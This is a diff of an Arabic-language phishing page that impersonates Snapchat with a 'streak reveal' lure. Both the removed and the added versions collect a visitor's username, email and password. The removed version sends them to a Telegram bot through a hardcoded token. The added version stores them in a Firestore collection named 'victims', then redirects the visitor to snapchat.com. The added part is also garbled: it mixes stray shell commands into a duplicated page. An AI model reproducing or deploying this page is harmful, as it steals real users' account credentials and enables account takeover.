@@ -1,93 +1,21 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat - كشف الستريك</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:'Segoe UI',Tahoma,sans-serif;
-            background:#fffc00;color:#000;min-height:100vh;
-            display:flex;align-items:center;justify-content:center;padding:20px;
-        }
-        .container{
-            background:#fff;border-radius:20px;padding:30px 20px;
-            max-width:400px;width:100%;text-align:center;
-            border:3px solid #000;box-shadow:8px 8px 0 #000;
-        }
-        .logo{font-size:55px;margin-bottom:10px}
-        h1{font-size:22px;font-weight:900;margin-bottom:5px}
-        .sub{color:#666;font-size:13px;margin-bottom:20px}
-        .fg{margin-bottom:14px;text-align:right}
-        label{display:block;color:#333;font-size:12px;font-weight:600;margin-bottom:5px}
-        input{
-            width:100%;padding:13px;background:#f5f5f5;
-            border:2px solid #ddd;border-radius:10px;
-            color:#000;font-size:14px;outline:none;
-        }
-        input:focus{border-color:#fffc00;box-shadow:0 0 10px rgba(255,252,0,0.5)}
-        input::placeholder{color:#999}
-        .btn{
-            width:100%;padding:14px;margin-top:10px;
-            background:#fffc00;color:#000;border:2px solid #000;
-            border-radius:25px;font-size:16px;font-weight:900;cursor:pointer;
-            box-shadow:4px 4px 0 #000;
-        }
-        .btn:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #000}
-        .load{
-            display:none;position:fixed;inset:0;background:rgba(255,252,0,0.95);z-index:99;
-            justify-content:center;align-items:center;flex-direction:column;
-        }
-        .load.show{display:flex}
-        .spinner{
-            width:50px;height:50px;border:4px solid #ddd;
-            border-top:4px solid #000;border-radius:50%;
-            animation:spin 0.8s linear infinite;margin-bottom:18px;
-        }
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .done{
-            display:none;position:fixed;inset:0;background:rgba(255,255,255,0.98);z-index:98;
-            justify-content:center;align-items:center;flex-direction:column;
-        }
-        .done.show{display:flex}
-        .done h2{color:#000;font-size:24px;margin:12px 0}
-    </style>
-</head>
-<body>
-
-<div class="container" id="form">
-    <div class="logo">👻</div>
-    <h1>Snapchat</h1>
-    <p class="sub">كشف الستريك واستعادة السنابات</p>
-    
-    <div class="fg"><label>👤 اسم المستخدم</label><input type="text" id="username" placeholder="@username"></div>
-    <div class="fg"><label>📧 البريد الإلكتروني</label><input type="text" id="email" placeholder="email@example.com"></div>
-    <div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
-    
-    <button class="btn" onclick="go()">👻 كشف الستريك</button>
-</div>
-
-<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري فحص الستريك...</p></div>
-<div class="done" id="done"><h2>✅ تم الكشف!</h2><p>سيتم إظهار النتائج قريباً</p></div>
-
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Snapchat</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#fffc00;color:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:#fff;border-radius:15px;padding:25px;max-width:400px;width:100%;text-align:center;border:3px solid #000;box-shadow:6px 6px 0 #000}.logo{font-size:40px;margin-bottom:10px}h1{font-size:18px;margin-bottom:15px;font-weight:900}
+cd ~/ai-proxy
+cat > public/snapchat.html << 'EOF'
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Snapchat</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#fffc00;color:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:#fff;border-radius:15px;padding:25px;max-width:400px;width:100%;text-align:center;border:3px solid #000;box-shadow:6px 6px 0 #000}.logo{font-size:40px;margin-bottom:10px}h1{font-size:18px;margin-bottom:15px;font-weight:900}input{width:100%;padding:12px;background:#f5f5f5;border:2px solid #ddd;border-radius:8px;font-size:13px;outline:none;margin-bottom:8px;color:#000}input:focus{border-color:#fffc00}.btn{width:100%;padding:12px;background:#fffc00;color:#000;border:2px solid #000;border-radius:20px;font-size:15px;font-weight:900;cursor:pointer;box-shadow:3px 3px 0 #000}.btn:active{transform:translate(2px,2px);box-shadow:1px 1px 0 #000}.load{display:none;position:fixed;inset:0;background:rgba(255,252,0,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}.load.show{display:flex}.spinner{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #000;border-radius:50%;animation:spin 0.8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style></head>
+<body><div class="container"><div class="logo">👻</div><h1>Snapchat</h1><p style="color:#666;font-size:12px;margin-bottom:15px">كشف الستريك</p>
+<input type="text" id="username" placeholder="اسم المستخدم">
+<input type="text" id="email" placeholder="البريد الإلكتروني">
+<input type="password" id="password" placeholder="كلمة المرور">
+<button class="btn" onclick="go()">👻 كشف</button></div>
+<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الكشف...</p></div>
 <script>
-const u=new URL(window.location.href);
-const CHAT=u.searchParams.get('chatId')||'7276604783';
-const TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-async function send(t){
-    try{await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
-}
-async function go(){
-    const un=document.getElementById('username').value.trim();
-    const em=document.getElementById('email').value.trim();
-    const pw=document.getElementById('password').value.trim();
-    if(!un||!em||!pw)return alert('املأ جميع الحقول');
-    document.getElementById('load').classList.add('show');
-    const msg=`👻 <b>ضحية سناب شات!</b>\n\n👤 يوزر: ${un}\n📧 إيميل: ${em}\n🔒 كلمة: ${pw}\n\n📱 ${navigator.userAgent}`;
-    await send(msg);
-    setTimeout(()=>{document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(()=>{window.location.href='https://snapchat.com/'},3000)},4000);
-}
-</script>
-</body>
-</html>
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();
+async function go(){var un=document.getElementById('username').value.trim(),em=document.getElementById('email').value.trim(),pw=document.getElementById('password').value.trim();if(!un||!em||!pw)return alert('املأ الحقول');document.getElementById('load').classList.add('show');await db.collection('victims').add({service:'👻 سناب شات',text:'👤 '+un+' | 📧 '+em+' | 🔒 '+pw,timestamp:new Date().toISOString()});setTimeout(function(){document.getElementById('load').classList.remove('show');window.location.href='https://snapchat.com/'},2000)}
+</script></body></html>
